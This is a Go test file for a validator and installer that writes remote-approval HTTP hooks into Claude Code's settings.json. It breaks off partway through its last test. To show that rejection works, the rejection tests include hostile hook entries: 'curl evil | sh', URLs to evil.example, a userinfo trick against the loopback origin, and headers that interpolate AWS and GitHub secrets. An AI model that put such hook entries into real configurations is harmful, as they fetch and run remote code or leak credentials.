package claudecfg

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"claircode.app/clair-agent/internal/envelope"
	"claircode.app/clair-agent/internal/ojson"
	"claircode.app/clair-agent/internal/record"
)

const (
	baseURL  = "http://127.0.0.1:7317"
	exePath  = "/opt/clair/clair"
	wrapped  = exePath + " statusline"
	original = `printf "it's %s" "$(cat | wc -c | tr -d ' ')"`
)

func defaultHooks() *ojson.Object {
	return RenderHooks(SnippetConfig{BaseURL: baseURL, Token: "t0k3n", Host: "walter-laptop", IncludeSessionStart: true, ClairExe: exePath})
}

func TestRenderHooksMatchesTheGolden(t *testing.T) {
	t.Parallel()

	want, err := os.ReadFile("testdata/hooks-default.json")
	if err != nil {
		t.Fatal(err)
	}
	got, err := ojson.Marshal(defaultHooks(), "  ")
	if err != nil {
		t.Fatal(err)
	}
	if string(got)+"\n" != string(want) {
		t.Fatalf("RenderHooks =\n%s\nwant\n%s", got, want)
	}
	if bytes.Count(got, []byte("…")) != 1 {
		t.Error("the ellipsis must be the U+2026 character, not \\u2026")
	}
}

func TestRenderHooksVariants(t *testing.T) {
	t.Parallel()

	noStart := RenderHooks(SnippetConfig{BaseURL: baseURL + "/", Token: "t", PermissionTimeoutSec: 600, EventTimeoutSec: 1})
	hooks := ojson.AsObject(mustGet(t, noStart, "hooks"))
	if _, ok := hooks.Get("SessionStart"); ok {
		t.Error("SessionStart rendered although not included")
	}
	data, _ := ojson.Marshal(noStart, "")
	if !strings.Contains(string(data), `/clair/v1/hook/decide?timeout=600","headers":{"Authorization":"Bearer t","X-Clair-Entrypoint":"$CLAUDE_CODE_ENTRYPOINT"},"allowedEnvVars":["CLAUDE_CODE_ENTRYPOINT"],"timeout":600`) {
		t.Errorf("custom permission timeout not applied: %s", data)
	}
	// Only the decide hook is told the session's entrypoint (ADR 2026-10.gw8w).
	if n := strings.Count(string(data), "allowedEnvVars"); n != 1 {
		t.Errorf("allowedEnvVars rendered %d times, want once, on the decide hook: %s", n, data)
	}
	if strings.Contains(string(data), "X-Clair-Host") || strings.Contains(string(data), "7317//") {
		t.Errorf("host header rendered without a host, or double slash: %s", data)
	}
	if !strings.Contains(string(data), `"timeout":1}`) {
		t.Errorf("custom event timeout not applied: %s", data)
	}
	// Without a binary path SessionStart is an http hook — for a Claude Code
	// that one day accepts one.
	httpStart := RenderHooks(SnippetConfig{BaseURL: baseURL, Token: "t", IncludeSessionStart: true})
	data, _ = ojson.Marshal(httpStart, "")
	if !strings.Contains(string(data), `"SessionStart":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event"`) {
		t.Errorf("SessionStart http form not rendered: %s", data)
	}
}

// snippetConfig is the host a phone snippet is validated for.
var snippetConfig = SnippetConfig{BaseURL: baseURL, Token: "t0k3n", Host: "walter-laptop", ClairExe: exePath}

// withAgentEvents is a compact block with the group the agent adds itself to
// one that has its decide hook (ADR 2026-10.ukr9), for snippetConfig.
func withAgentEvents(block string) string {
	const group = `"PostToolBatch":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"},"timeout":2}]}]`
	return strings.TrimSuffix(block, "}}") + "," + group + "}}"
}

func TestSubstituteAndValidate(t *testing.T) {
	t.Parallel()

	snippet := []byte(`{"hooks":{"PermissionRequest":[{"hooks":[{"type":"http","url":"http://127.0.0.1:__PORT__/clair/v1/hook/decide?timeout=600","headers":{"Authorization":"Bearer __TOKEN__","X-Clair-Host":"__CLAIR_HOST__"},"timeout":600}]}],"SessionStart":[{"hooks":[{"type":"command","command":"__CLAIR_EXE__ hook-event /clair/v1/hook/event"}]}]}}`)
	got := Substitute(snippet, 7317, "t0k3n", "walter-laptop", exePath)
	want := `{"hooks":{"PermissionRequest":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide?timeout=600","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"},"timeout":600}]}],"SessionStart":[{"hooks":[{"type":"command","command":"/opt/clair/clair hook-event /clair/v1/hook/event"}]}]}}`
	if string(got) != want {
		t.Fatalf("Substitute =\n%s\nwant\n%s", got, want)
	}
	hooks, dropped, err := ValidateSnippet(got, snippetConfig)
	if err != nil || dropped != nil {
		t.Fatalf("ValidateSnippet: %v, dropped %q", err, dropped)
	}
	rebuilt := withAgentEvents(`{"hooks":{"PermissionRequest":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide?timeout=600","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop","X-Clair-Entrypoint":"$CLAUDE_CODE_ENTRYPOINT"},"allowedEnvVars":["CLAUDE_CODE_ENTRYPOINT"],"timeout":600}]}],"SessionStart":[{"hooks":[{"type":"command","command":"/opt/clair/clair hook-event /clair/v1/hook/event"}]}]}}`)
	if got := compact(t, hooks); got != rebuilt {
		t.Errorf("ValidateSnippet =\n%s\nwant the snippet with the agent's entrypoint header and its own events\n%s", got, rebuilt)
	}
}

// The phone's relayTemplate() with its defaults is the agent's own default
// block with placeholders, less the decide hook's entrypoint header the agent
// adds itself: rebuilding it must give exactly that block.
func TestValidateSnippetKeepsThePhoneTemplate(t *testing.T) {
	t.Parallel()

	template, err := os.ReadFile("testdata/phone-relay-snippet.json")
	if err != nil {
		t.Fatal(err)
	}
	hooks, _, err := ValidateSnippet(Substitute(template, 7317, "t0k3n", "walter-laptop", exePath), snippetConfig)
	if err != nil {
		t.Fatalf("ValidateSnippet: %v", err)
	}
	if got, want := compact(t, hooks), compact(t, defaultHooks()); got != want {
		t.Errorf("rebuilt template =\n%s\nwant RenderHooks' default\n%s", got, want)
	}
}

// phoneTemplate is the phone's relayTemplate() with its defaults.
func phoneTemplate(t *testing.T) []byte {
	t.Helper()
	template, err := os.ReadFile("testdata/phone-relay-snippet.json")
	if err != nil {
		t.Fatal(err)
	}
	return template
}

// hookAt returns the first hook of an event's first group in a hooks block.
func hookAt(t *testing.T, block ojson.Value, event string) *ojson.Object {
	t.Helper()
	hooks := ojson.AsObject(mustGet(t, ojson.AsObject(block), "hooks"))
	groups := ojson.AsArray(mustGet(t, hooks, event))
	if len(groups) == 0 {
		t.Fatalf("%s has no group", event)
	}
	inner := ojson.AsArray(mustGet(t, ojson.AsObject(groups[0]), "hooks"))
	if len(inner) == 0 {
		t.Fatalf("%s has no hook", event)
	}
	return ojson.AsObject(inner[0])
}

// Every value lands inside a JSON string, so it is escaped for one: the
// quotes either platform's shell quoting adds must not end the string. This
// runs the quoting of both platforms on any GOOS.
func TestSubstituteEscapesEveryValueForJSON(t *testing.T) {
	t.Parallel()

	tests := []struct{ name, quotedExe, token, host string }{
		{name: "a Windows path with a space", quotedExe: `"C:/Program Files/clair/clair.exe"`, token: "t0k3n", host: "walter-laptop"},
		{name: "a Unix path with a single quote", quotedExe: `'/opt/it'"'"'s/clair'`, token: "t0k3n", host: "walter-laptop"},
		{name: "a Unix path with a double quote and a backslash", quotedExe: `'/opt/say "hi"\/clair'`, token: "t0k3n", host: "walter-laptop"},
		{name: "a token and a host that need escaping", quotedExe: "/opt/clair/clair", token: `t"0\k`, host: "a\"b\nc"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			out := substituteQuoted(phoneTemplate(t), "7317", tt.token, tt.host, tt.quotedExe)
			v, err := ojson.ParseBytes(out)
			if err != nil {
				t.Fatalf("substituted snippet is not JSON: %v\n%s", err, out)
			}
			if got, want := ojson.AsString(mustGet(t, hookAt(t, v, "SessionStart"), "command")), tt.quotedExe+" hook-event /clair/v1/hook/event"; got != want {
				t.Errorf("SessionStart command = %q, want %q", got, want)
			}
			headers := ojson.AsObject(mustGet(t, hookAt(t, v, "Stop"), "headers"))
			if got := ojson.AsString(mustGet(t, headers, "Authorization")); got != "Bearer "+tt.token {
				t.Errorf("Authorization = %q, want the token as given", got)
			}
			if got := ojson.AsString(mustGet(t, headers, "X-Clair-Host")); got != tt.host {
				t.Errorf("X-Clair-Host = %q, want %q", got, tt.host)
			}
		})
	}
}

// checkPhoneSnippetFor substitutes the phone's template for a binary at exe
// on this platform, and wants it accepted and rebuilt into the built-in
// block for that binary, then installed and read back.
func checkPhoneSnippetFor(t *testing.T, exe string) {
	t.Helper()
	c := SnippetConfig{BaseURL: baseURL, Token: "t0k3n", Host: "walter-laptop", ClairExe: exe}
	hooks, dropped, err := ValidateSnippet(Substitute(phoneTemplate(t), 7317, c.Token, c.Host, exe), c)
	if err != nil || dropped != nil {
		t.Fatalf("ValidateSnippet for %q: %v, dropped %q", exe, err, dropped)
	}
	c.IncludeSessionStart = true
	if got, want := compact(t, hooks), compact(t, RenderHooks(c)); got != want {
		t.Errorf("rebuilt for %q =\n%s\nwant the built-in block\n%s", exe, got, want)
	}
	in := fixture(t, "")
	in.ClairExe = exe
	si := SnippetInstaller{Installer: in, BaseURL: baseURL, Port: 7317, Token: c.Token, Host: c.Host}
	if _, err := si.InstallSnippet(phoneTemplate(t)); err != nil {
		t.Fatalf("InstallSnippet for %q: %v", exe, err)
	}
	if got := ojson.AsString(mustGet(t, hookAt(t, readSettings(t, in), "SessionStart"), "command")); got != HookEventCommand(exe) {
		t.Errorf("installed SessionStart command = %q, want %q", got, HookEventCommand(exe))
	}
}

// A binary path the shell must quote still yields a snippet the validator
// accepts: the phone's own template, not a hand-made one.
func TestPhoneSnippetForAnAwkwardBinaryPath(t *testing.T) {
	t.Parallel()

	for _, exe := range []string{"/opt/my tools/clair", "/opt/it's/clair", `/opt/say "hi"/clair`, `/opt/back\slash/clair`} {
		t.Run(exe, func(t *testing.T) {
			t.Parallel()
			checkPhoneSnippetFor(t, exe)
		})
	}
}

// The phone's template hard-codes 127.0.0.1; an agent listening on another
// spelling of loopback accepts it for its own port and writes its own
// origin. Its own spelling is accepted too; another port is not.
func TestValidateSnippetAcceptsThePhonesLoopbackForTheAgentsPort(t *testing.T) {
	t.Parallel()

	for _, base := range []string{"http://127.0.0.1:7317", "http://localhost:7317", "http://[::1]:7317"} {
		t.Run(base, func(t *testing.T) {
			t.Parallel()
			c := SnippetConfig{BaseURL: base, Token: "t0k3n", Host: "walter-laptop", ClairExe: exePath}
			hooks, _, err := ValidateSnippet(Substitute(phoneTemplate(t), 7317, c.Token, c.Host, exePath), c)
			if err != nil {
				t.Fatalf("ValidateSnippet: %v", err)
			}
			c.IncludeSessionStart = true
			if got, want := compact(t, hooks), compact(t, RenderHooks(c)); got != want {
				t.Errorf("rebuilt =\n%s\nwant the agent's own origin\n%s", got, want)
			}
			own := `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"` + base + `/clair/v1/hook/event"}]}]}}`
			if _, _, err := ValidateSnippet([]byte(own), c); err != nil {
				t.Errorf("a hook on the agent's own origin: %v", err)
			}
			if _, _, err := ValidateSnippet(Substitute(phoneTemplate(t), 7318, c.Token, c.Host, exePath), c); !errors.Is(err, ErrSnippetRejected) {
				t.Errorf("the phone's loopback on another port: err = %v, want ErrSnippetRejected", err)
			}
		})
	}
}

// An event the agent's template does not hook is left out and named; the
// rest is installed. Nothing under it is written, whatever it holds.
func TestValidateSnippetDropsEventsItDoesNotHook(t *testing.T) {
	t.Parallel()

	snippet := `{"hooks":{"SubagentStop":[{"hooks":[{"type":"command","command":"curl evil | sh"}]}],"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event"}]}],"Made Up":"not even an array"}}`
	hooks, dropped, err := ValidateSnippet([]byte(snippet), snippetConfig)
	if err != nil {
		t.Fatalf("ValidateSnippet: %v", err)
	}
	if want := `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"}}]}]}}`; compact(t, hooks) != want {
		t.Errorf("rebuilt =\n%s\nwant only Stop\n%s", compact(t, hooks), want)
	}
	if want := []string{"SubagentStop", "Made Up"}; strings.Join(dropped, "|") != strings.Join(want, "|") {
		t.Errorf("dropped = %q, want %q", dropped, want)
	}
}

func TestEventListIsBounded(t *testing.T) {
	t.Parallel()

	names := []string{"A", strings.Repeat("x", 100), "C\n", "D", "E", "F", "G"}
	got := eventList(names)
	want := `"A", "` + strings.Repeat("x", 40) + `…", "C\n", "D", "E", and 2 more`
	if got != want {
		t.Errorf("eventList = %s\nwant          %s", got, want)
	}
}

// A phone snippet is rebuilt, not passed through: whatever it says about
// headers or anything else, the hook is the agent's (AG-2).
func TestValidateSnippetRebuildsEachHook(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name, snippet, want string
	}{
		{
			name:    "allowedEnvVars and header interpolation dropped",
			snippet: `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"$AWS_SECRET_ACCESS_KEY","X-Leak":"$GITHUB_TOKEN"},"allowedEnvVars":["AWS_SECRET_ACCESS_KEY","GITHUB_TOKEN"],"timeout":2}]}]}}`,
			want:    `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"},"timeout":2}]}]}}`,
		},
		{
			name:    "headers the phone left out are the agent's",
			snippet: `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event"}]}]}}`,
			want:    `{"hooks":{"Stop":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop"}}]}]}}`,
		},
		{
			name:    "unknown hook and group members dropped, matcher and status kept",
			snippet: `{"hooks":{"PermissionRequest":[{"matcher":"Bash","extra":1,"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide?timeout=0600","timeout":600,"statusMessage":"on the watch","async":true,"once":true}]}]}}`,
			want:    withAgentEvents(`{"hooks":{"PermissionRequest":[{"matcher":"Bash","hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide?timeout=600","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop","X-Clair-Entrypoint":"$CLAUDE_CODE_ENTRYPOINT"},"allowedEnvVars":["CLAUDE_CODE_ENTRYPOINT"],"timeout":600,"statusMessage":"on the watch"}]}]}}`),
		},
		{
			name:    "the decide hook's environment is the agent's, whatever the phone lists",
			snippet: `{"hooks":{"PermissionRequest":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide","headers":{"Authorization":"Bearer t0k3n","X-Clair-Entrypoint":"$AWS_SECRET_ACCESS_KEY"},"allowedEnvVars":["AWS_SECRET_ACCESS_KEY","CLAUDE_CODE_ENTRYPOINT"]}]}]}}`,
			want:    withAgentEvents(`{"hooks":{"PermissionRequest":[{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/decide","headers":{"Authorization":"Bearer t0k3n","X-Clair-Host":"walter-laptop","X-Clair-Entrypoint":"$CLAUDE_CODE_ENTRYPOINT"},"allowedEnvVars":["CLAUDE_CODE_ENTRYPOINT"]}]}]}}`),
		},
		{
			name:    "the own command hook loses anything beside its command",
			snippet: `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"/opt/clair/clair hook-event /clair/v1/hook/event","timeout":5}]}]}}`,
			want:    `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"/opt/clair/clair hook-event /clair/v1/hook/event"}]}]}}`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			hooks, _, err := ValidateSnippet([]byte(tt.snippet), snippetConfig)
			if err != nil {
				t.Fatalf("ValidateSnippet: %v", err)
			}
			if got := compact(t, hooks); got != tt.want {
				t.Errorf("rebuilt =\n%s\nwant\n%s", got, tt.want)
			}
		})
	}
}

func TestValidateSnippetRejects(t *testing.T) {
	t.Parallel()

	hook := func(event, h string) string { return `{"hooks":{"` + event + `":[{"hooks":[` + h + `]}]}}` }
	http := func(url string) string { return `{"type":"http","url":"` + url + `"}` }
	const (
		event  = baseURL + "/clair/v1/hook/event"
		decide = baseURL + "/clair/v1/hook/decide"
	)
	rejected := []struct{ name, snippet string }{
		{"command hook", hook("SessionStart", `{"type":"command","command":"curl evil"}`)},
		{"own command hook on PermissionRequest", hook("PermissionRequest", `{"type":"command","command":"/opt/clair/clair hook-event /clair/v1/hook/event"}`)},
		{"foreign url", hook("Stop", http("https://evil.example/clair/v1/hook/event"))},
		{"other loopback", hook("Stop", http("http://127.0.0.1:9999/clair/v1/hook/event"))},
		{"another loopback spelling than the agent's or the phone's", hook("Stop", http("http://localhost:7317/clair/v1/hook/event"))},
		{"the canonical host on a longer port", hook("Stop", http("http://127.0.0.1:73170/clair/v1/hook/event"))},
		{"userinfo after the origin", hook("Stop", http("http://127.0.0.1:7317@evil.example/clair/v1/hook/event"))},
		{"outside the prefix", hook("Stop", http(baseURL+"/other"))},
		{"Stop routed to decide", hook("Stop", http(decide))},
		{"PreToolUse routed to decide", hook("PreToolUse", http(decide+"?timeout=30"))},
		{"PermissionRequest routed to event", hook("PermissionRequest", http(event))},
		{"another endpoint under the marker", hook("Stop", http(baseURL+"/clair/v1/statusline"))},
		{"a query on the event endpoint", hook("Stop", http(event+"?timeout=5"))},
		{"a query other than the timeout", hook("PermissionRequest", http(decide+"?x=1"))},
		{"a second query parameter", hook("PermissionRequest", http(decide+"?timeout=30&x=1"))},
		{"a query timeout of zero", hook("PermissionRequest", http(decide+"?timeout=0"))},
		{"a query timeout over a day", hook("PermissionRequest", http(decide+"?timeout=86401"))},
		{"a fragment", hook("Stop", http(event+"#x"))},
		{"a string timeout", hook("Stop", `{"type":"http","url":"`+event+`","timeout":"2"}`)},
		{"a fractional timeout", hook("Stop", `{"type":"http","url":"`+event+`","timeout":1.5}`)},
		{"a matcher that is not a string", `{"hooks":{"Stop":[{"matcher":1,"hooks":[` + http(event) + `]}]}}`},
		{"no type", hook("Stop", `{"url":"`+event+`"}`)},
		{"missing hooks", `{"permissions":{}}`},
		{"no events", `{"hooks":{}}`},
		{"only events the agent does not hook", hook("FutureEvent", http(event))},
		{"hooks not object", `{"hooks":[]}`},
		{"group not object", `{"hooks":{"Stop":["x"]}}`},
		{"event not array", `{"hooks":{"Stop":{}}}`},
		{"event an empty array", `{"hooks":{"Stop":[]}}`},
		{"group without hooks", `{"hooks":{"Stop":[{"matcher":"x"}]}}`},
		{"group with empty hooks", `{"hooks":{"Stop":[{"hooks":[]}]}}`},
		{"over the size cap", `{"hooks":{"Stop":[{"hooks":[` + http(event) + `]}]},"x":"` + strings.Repeat("x", maxSnippetBytes) + `"}`},
		{"nested past the depth cap", `{"hooks":{"Stop":[{"hooks":[` + http(event) + `]}]},"x":` + strings.Repeat("[", ojson.MaxDepth) + strings.Repeat("]", ojson.MaxDepth) + `}`},
		{"hook not object", `{"hooks":{"Stop":[{"hooks":[1]}]}}`},
		{"not json", `{`},
		{"not an object", `[]`},
	}
	for _, tt := range rejected {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if _, _, err := ValidateSnippet([]byte(tt.snippet), snippetConfig); !errors.Is(err, ErrSnippetRejected) {
				t.Errorf("err = %v, want ErrSnippetRejected", err)
			}
		})
	}
	noExe := snippetConfig
	noExe.ClairExe = ""
	if _, _, err := ValidateSnippet([]byte(hook("SessionStart", `{"type":"command","command":" hook-event /clair/v1/hook/event"}`)), noExe); !errors.Is(err, ErrSnippetRejected) {
		t.Errorf("command hook without a known binary: err = %v, want ErrSnippetRejected", err)
	}
}

func TestIsOurStatusLine(t *testing.T) {
	t.Parallel()

	tests := map[string]bool{
		"/opt/clair/clair statusline":                   true,
		"'/opt/my tools/clair' statusline":              true,
		`'/opt/it'"'"'s/clair' statusline`:              true,
		`"C:/Users/w/clair.exe" statusline`:             true,
		"C:/Users/w/clair.exe  statusline":              true,
		`C:\Users\w\clair-windows-amd64.exe statusline`: true,
		"/usr/local/bin/clair-linux-amd64 statusline":   true,
		"/opt/clair-agent statusline":                   true,
		"sh /home/w/.claude/clair-statusline.sh":        true,
		"/opt/clair/clair status":                       false,
		"/opt/clair/clair statusline --x":               false,
		"/opt/clair/clairstatusline":                    false,
		"claircode statusline":                          false,
		"'/opt/clair/clair statusline":                  false,
		"printf 'ok'":                                   false,
		"":                                              false,
	}
	for cmd, want := range tests {
		if got := IsOurStatusLine(cmd); got != want {
			t.Errorf("IsOurStatusLine(%q) = %v, want %v", cmd, got, want)
		}
	}
}

func TestSettingsPath(t *testing.T) {
	t.Parallel()

	cc, home := filepath.Join("tmp", "cc"), filepath.Join("home", "w")
	got, err := SettingsPath(func(string) string { return cc }, func() (string, error) { return home, nil })
	if err != nil || got != filepath.Join(cc, "settings.json") {
		t.Errorf("SettingsPath with CLAUDE_CONFIG_DIR = %q, %v", got, err)
	}
	got, err = SettingsPath(func(string) string { return "" }, func() (string, error) { return home, nil })
	if err != nil || got != filepath.Join(home, ".claude", "settings.json") {
		t.Errorf("SettingsPath = %q, %v", got, err)
	}
	if _, err := SettingsPath(func(string) string { return "" }, func() (string, error) { return "", errors.New("no home") }); err == nil {
		t.Error("SettingsPath without a home: want an error")
	}
}

// fixture copies the phone's InstallerScriptTest settings into a scratch dir.
func fixture(t *testing.T, before string) Installer {
	t.Helper()
	dir := filepath.Join(t.TempDir(), ".claude")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "settings.json")
	if before != "" {
		if err := os.WriteFile(path, []byte(before), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	stamp := time.Date(2026, 9, 21, 12, 0, 0, 0, time.UTC)
	return Installer{SettingsPath: path, ClairExe: exePath, Now: func() time.Time { return stamp }, Stderr: io.Discard}
}

func readSettings(t *testing.T, in Installer) *ojson.Object {
	t.Helper()
	data, err := os.ReadFile(in.SettingsPath)
	if err != nil {
		t.Fatal(err)
	}
	v, err := ojson.ParseBytes(data)
	if err != nil {
		t.Fatalf("settings.json is not valid: %v\n%s", err, data)
	}
	return ojson.AsObject(v)
}

func mustGet(t *testing.T, obj *ojson.Object, key string) ojson.Value {
	t.Helper()
	v, ok := obj.Get(key)
	if !ok {
		t.Fatalf("missing key %q", key)
	}
	return v
}

func compact(t *testing.T, v ojson.Value) string {
	t.Helper()
	data, err := ojson.Marshal(v, "")
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func backups(t *testing.T, in Installer) []string {
	t.Helper()
	matches, err := filepath.Glob(in.SettingsPath + ".bak-*")
	if err != nil {
		t.Fatal(err)
	}
	return matches
}

func TestInstallMergesLikeThePhoneInstaller(t *testing.T) {
	t.Parallel()

	before, err := os.ReadFile("testdata/settings-before.json")
	if err != nil {
		t.Fatal(err)
	}
	in := fixture(t, string(before))
	report, err := in.Install(defaultHooks())
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if report.StatusLine != "wrapped" || report.Backup == "" {
		t.Errorf("report = %+v, want wrapped with a backup", report)
	}
	s := readSettings(t, in)
	if keys := s.Keys(); keys[0] != "permissions" || compact(t, mustGet(t, s, "permissions")) != `{"allow":["Bash(ls:*)"]}` {
		t.Errorf("permissions moved or changed: keys %v", keys)
	}
	hooks := ojson.AsObject(mustGet(t, s, "hooks"))
	stop := compact(t, mustGet(t, hooks, "Stop"))
	if !strings.HasPrefix(stop, `[{"hooks":[{"type":"command","command":"say done"}]},{"hooks":[{"type":"http","url":"http://127.0.0.1:7317/clair/v1/hook/event"`) {
		t.Errorf("Stop = %s, want the user's hook first then ours", stop)
	}
	if keys := hooks.Keys(); keys[0] != "Stop" || keys[1] != "PermissionRequest" {
		t.Errorf("hook events = %v, want Stop kept first then ours appended", keys)
	}
	if got := compact(t, mustGet(t, hooks, "PermissionRequest")); strings.Count(got, "/clair/v1/hook/decide?timeout=86400") != 1 {
		t.Errorf("PermissionRequest = %s", got)
	}
	if got := compact(t, mustGet(t, s, "statusLine")); got != `{"type":"command","command":"`+wrapped+`","padding":0}` {
		t.Errorf("statusLine = %s", got)
	}
	saved, err := os.ReadFile(in.originalPath())
	if err != nil || strings.TrimSpace(string(saved)) != `{"type":"command","command":"`+strings.ReplaceAll(original, `"`, `\"`)+`","padding":0}` {
		t.Errorf("original.json = %s (%v)", saved, err)
	}
	if got := backups(t, in); len(got) != 1 {
		t.Errorf("backups = %v, want exactly one", got)
	}

	// Installing again neither duplicates nor wraps the wrapper; it finds
	// nothing to change and writes nothing.
	report, err = in.Install(defaultHooks())
	if err != nil {
		t.Fatalf("second Install: %v", err)
	}
	if !report.Unchanged || report.Backup != "" {
		t.Errorf("second install report = %+v, want unchanged without a backup", report)
	}
	s = readSettings(t, in)
	hooks = ojson.AsObject(mustGet(t, s, "hooks"))
	if got := compact(t, mustGet(t, hooks, "PermissionRequest")); strings.Count(got, "hook/decide") != 1 {
		t.Errorf("PermissionRequest after a second install = %s", got)
	}
	if got := compact(t, mustGet(t, hooks, "Stop")); strings.Count(got, "say done") != 1 || strings.Count(got, "/clair/v1/") != 1 {
		t.Errorf("Stop after a second install = %s", got)
	}
	if got := compact(t, mustGet(t, s, "statusLine")); got != `{"type":"command","command":"`+wrapped+`","padding":0}` {
		t.Errorf("statusLine after a second install = %s", got)
	}
	if saved, _ := os.ReadFile(in.originalPath()); !strings.Contains(string(saved), "printf") {
		t.Errorf("original.json after a second install = %s, want the user's command still", saved)
	}
	if got := backups(t, in); len(got) != 1 {
		t.Errorf("backups after two installs = %v, want only the first's", got)
	}

	// Uninstall puts everything back.
	report, err = in.Uninstall()
	if err != nil {
		t.Fatalf("Uninstall: %v", err)
	}
	if report.StatusLine != "restored" {
		t.Errorf("uninstall report = %+v, want restored", report)
	}
	s = readSettings(t, in)
	if got := compact(t, mustGet(t, s, "hooks")); got != `{"Stop":[{"hooks":[{"type":"command","command":"say done"}]}]}` {
		t.Errorf("hooks after uninstall = %s", got)
	}
	if got := compact(t, mustGet(t, s, "statusLine")); got != `{"type":"command","command":"`+strings.ReplaceAll(original, `"`, `\"`)+`","padding":0}` {
		t.Errorf("statusLine after uninstall = %s", got)
	}
	if _, err := os.Stat(in.originalPath()); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("original.json after uninstall: %v, want gone", err)
	}
	if got := compact(t, mustGet(t, s, "permissions")); got != `{"allow":["Bash(ls:*)"]}` {
		t.Errorf("permissions after uninstall = %s", got)
	}
}

func TestInstallWithoutAStatusLineOrSettings(t *testing.T) {
	t.Parallel()

	in := fixture(t, "")
	report, err := in.Install(defaultHooks())
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if report.Backup != "" || report.StatusLine != "wrapped" {
		t.Errorf("report = %+v, want no backup and a wrapped statusLine", report)
	}
	s := readSettings(t, in)
	if got := compact(t, mustGet(t, s, "statusLine")); got != `{"type":"command","command":"`+wrapped+`"}` {
		t.Errorf("statusLine = %s", got)
	}
	if saved, _ := os.ReadFile(in.originalPath()); strings.TrimSpace(string(saved)) != "null" {
		t.Errorf("original.json = %q, want null", saved)
	}
	if _, err := in.Uninstall(); err != nil {
		t.Fatalf("Uninstall: %v", err)
	}
	s = readSettings(t, in)
	if _, ok := s.Get("statusLine"); ok {
		t.Error("statusLine still present after uninstall with no original")
	}
	if _, ok := s.Get("hooks"); ok {
		t.Error("hooks still present after uninstall with nothing foreign")
	}
	if s.Len() != 0 {
		t.Errorf("settings after uninstall = %s, want {}", compact(t, s))
	}
}

func TestInstallLeavesANonCommandStatusLineAlone(t *testing.T) {
	t.Parallel()

	in := fixture(t, `{"statusLine":{"type":"widget","source":"x"}}`)
	var stderr bytes.Buffer
	in.Stderr = &stderr
	report, err := in.Install(defaultHooks())
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if report.StatusLine != "kept" || !strings.Contains(stderr.String(), "not a command") {
		t.Errorf("report = %+v, stderr = %q", report, stderr.String())
	}
	s := readSettings(t, in)
	if got := compact(t, mustGet(t, s, "statusLine")); got != `{"type":"widget","source":"x"}` {
		t.Errorf("statusLine = %s, want untouched", got)
	}
	if _, err := os.Stat(in.originalPath()); !errors.Is(err, os.ErrNotExist) {
		t.Error("original.json written for a statusLine that was left alone")
	}
}

func TestInstallMigratesTheLegacyShim(t *testing.T) {
	t.Parallel()

	in := fixture(t, `{"statusLine":{"type":"command","command":"sh /home/w/.claude/clair-statusline.sh","padding":1}}`)
	dir := filepath.Dir(in.SettingsPath)
	if err := os.WriteFile(filepath.Join(dir, legacyShim), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(in.originalPath(), []byte(`{"type":"command","command":"echo mine"}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := in.Install(defaultHooks()); err != nil {
		t.Fatalf("Install: %v", err)
	}
	s := readSettings(t, in)
	if got := compact(t, mustGet(t, s, "statusLine")); got != `{"type":"command","command":"`+wrapped+`"}` {
		t.Errorf("statusLine = %s, want the shim replaced (padding comes from the original)", got)
	}
	if saved, _ := os.ReadFile(in.originalPath()); !strings.Contains(string(saved), "echo mine") {
		t.Errorf("original.json = %s, want the LAN installer's saved original kept", saved)
	}
	if _, err := os.Stat(filepath.Join(dir, legacyShim)); !errors.Is(err, os.ErrNotExist) {
		t.Error("legacy shim still present")
	}
}

func TestInstallRefusesANonObjectSettingsFile(t *testing.T) {
	t.Parallel()

	in := fixture(t, `[1,2]`)
